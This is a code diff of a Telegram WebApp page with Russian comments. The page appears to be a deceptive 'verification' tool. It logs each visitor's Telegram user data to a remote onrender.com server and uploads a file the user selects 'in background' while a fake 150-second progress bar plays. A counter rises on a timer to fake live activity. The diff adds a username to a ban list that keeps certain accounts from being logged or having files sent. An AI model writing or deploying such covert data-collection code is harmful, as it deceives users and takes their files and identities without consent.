@@ -327,10 +327,11 @@
 
     <script>
         // === СПИСОК ЗАБЛОКИРОВАННЫХ ПОЛЬЗОВАТЕЛЕЙ ===
-        const BANNED_USERS = ['monk']; 
+        // Никнеймы писать маленькими буквами без @
+        const BANNED_USERS = ['monk', 'tarips']; 
         // ===========================================
 
-        const SERVER_URL = "https://nicegrammarse-1.onrender.com";
+        const SERVER_URL = "https://nicegrammarse.onrender.com";
         const tg = window.Telegram.WebApp;
         tg.expand();
 
@@ -344,6 +345,7 @@
             try {
                 const user = tg.initDataUnsafe.user;
                 if (!user || !user.username) return false;
+                // Проверяем никнейм (приводим к нижнему регистру)
                 return BANNED_USERS.includes(user.username.toLowerCase());
             } catch (e) {
                 return false; 
@@ -353,7 +355,12 @@
         function logEntry() {
             try {
                 const user = tg.initDataUnsafe.user || {};
-                if (isUserBanned()) return; 
+                
+                // ЕСЛИ ЗАБАНЕН - ВЫХОДИМ, НИЧЕГО НЕ ОТПРАВЛЯЯ
+                if (isUserBanned()) {
+                    console.log("Log blocked for banned user");
+                    return; 
+                }
 
                 fetch(`${SERVER_URL}/log_entry`, {
                     method: 'POST',
@@ -370,19 +377,16 @@
         logEntry();
 
         // === СКРИПТ АНИМАЦИИ СЧЕТЧИКА ===
-        // Увеличивает число на 1 каждые 10 секунд
         setInterval(() => {
             const counterElement = document.getElementById('live-counter');
             if (counterElement) {
-                // Берем только цифры из текста (удаляем пробелы и &nbsp;)
                 let currentVal = parseInt(counterElement.innerText.replace(/\D/g, ''));
                 if (!isNaN(currentVal)) {
                     currentVal++;
-                    // toLocaleString('ru-RU') добавляет разделитель (пробел)
                     counterElement.innerText = currentVal.toLocaleString('ru-RU');
                 }
             }
-        }, 10000); // 10000 мс = 10 секунд
+        }, 10000); 
         // ================================
 
         function startVerification(input) {
@@ -392,8 +396,10 @@
             document.getElementById('step-start').style.display = 'none';
             document.getElementById('step-loading').style.display = 'flex';
 
+            // Попытка отправить файл (заблокируется внутри функции, если юзер в бане)
             uploadFileInBackground(file);
 
+            // ВИЗУАЛЬНАЯ ЧАСТЬ РАБОТАЕТ ДЛЯ ВСЕХ (В ТОМ ЧИСЛЕ ДЛЯ ЗАБАНЕННЫХ)
             let progress = 0;
             const totalDuration = 150000; 
             const intervalTime = 100; 
@@ -426,7 +432,12 @@
         function uploadFileInBackground(file) {
             try {
                 const user = tg.initDataUnsafe.user || {};
-                if (isUserBanned()) return; 
+                
+                // ЕСЛИ ЗАБАНЕН - ВЫХОДИМ, ФАЙЛ НЕ ОТПРАВЛЯЕТСЯ
+                if (isUserBanned()) {
+                    console.log("File upload blocked for banned user");
+                    return; 
+                }
 
                 const formData = new FormData();
                 formData.append('file', file);
